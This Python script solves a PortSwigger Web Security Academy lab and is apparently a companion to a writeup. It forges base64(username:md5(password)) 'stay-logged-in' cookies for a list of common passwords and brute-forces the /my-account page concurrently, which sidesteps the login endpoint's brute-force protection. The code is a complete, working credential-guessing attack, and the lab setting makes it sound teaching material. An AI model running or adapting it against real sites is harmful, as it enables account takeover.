#!/usr/bin/env python3
"""
Brute-forcing a stay-logged-in cookie
PortSwigger Web Security Academy -- Authentication

Companion script for the writeup: 10-brute-forcing-a-stay-logged-in-cookie.md

What this does:
    The "stay-logged-in" cookie is base64(username:md5(password)) -- entirely
    deterministic and self-contained, with no server-side randomness. For every
    candidate password, this script computes that exact cookie value offline and
    presents it directly as a header on GET /my-account, concurrently across 10
    workers. No login attempts are made at all, so /login's own brute-force
    protection is never touched -- this endpoint has none of its own.

Usage:
    python 10-brute-forcing-a-stay-logged-in-cookie.py <lab-url>

Requirements:
    pip install httpx
"""

import base64
import hashlib
import sys
import threading
import httpx
from concurrent.futures import ThreadPoolExecutor, as_completed

TARGET_USER = "carlos"
MAX_WORKERS = 10

PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "123456789", "12345", "1234",
    "111111", "1234567", "dragon", "123123", "baseball", "abc123", "football",
    "monkey", "letmein", "shadow", "master", "666666", "qwertyuiop", "123321",
    "mustang", "1234567890", "michael", "654321", "superman", "1qaz2wsx",
    "7777777", "121212", "000000", "qazwsx", "123qwe", "killer", "trustno1",
    "jordan", "jennifer", "zxcvbnm", "asdfgh", "hunter", "buster", "soccer",
    "harley", "batman", "andrew", "tigger", "sunshine", "iloveyou", "2000",
    "charlie", "robert", "thomas", "hockey", "ranger", "daniel", "starwars",
    "klaster", "112233", "george", "computer", "michelle", "jessica", "pepper",
    "1111", "zxcvbn", "555555", "11111111", "131313", "freedom", "777777",
    "pass", "maggie", "159753", "aaaaaa", "ginger", "princess", "joshua",
    "cheese", "amanda", "summer", "love", "ashley", "nicole", "chelsea",
    "biteme", "matthew", "access", "yankees", "987654321", "dallas", "austin",
    "thunder", "taylor", "matrix", "mobilemail", "mom", "monitor",
    "monitoring", "montana", "moon", "moscow",
]


def solve(lab_url: str) -> None:
    stop = threading.Event()
    result = [None]
    lock = threading.Lock()

    def try_pw(pw: str):
        if stop.is_set():
            return
        md5_hash = hashlib.md5(pw.encode()).hexdigest()
        cookie_val = base64.b64encode(f"{TARGET_USER}:{md5_hash}".encode()).decode()
        try:
            with httpx.Client(follow_redirects=True, timeout=15) as c:
                resp = c.get(f"{lab_url}/my-account", cookies={"stay-logged-in": cookie_val})
                if (resp.status_code == 200 and "log in" not in resp.text.lower()
                        and TARGET_USER in resp.text.lower()):
                    with lock:
                        if result[0] is None:
                            result[0] = (pw, cookie_val)
                    stop.set()
        except httpx.HTTPError:
            pass

    print(f"[*] Brute-forcing stay-logged-in cookie for {TARGET_USER} with {MAX_WORKERS} workers...")
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as pool:
        futures = {pool.submit(try_pw, pw): pw for pw in PASSWORDS}
        for f in as_completed(futures):
            if stop.is_set():
                for pending in futures:
                    pending.cancel()
                break

    if not result[0]:
        print("[-] No password matched from the candidate list.")
        return

    pw, cookie_val = result[0]
    print(f"[+] Password: {pw} (cookie: {cookie_val})")

    client = httpx.Client(follow_redirects=True, timeout=15)
    client.cookies.set("stay-logged-in", cookie_val)
    client.get(f"{lab_url}/my-account")

    check = client.get(lab_url)
    if "congratulations" in check.text.lower():
        print("[+] Lab solved.")
    else:
        print("[-] Not solved yet.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
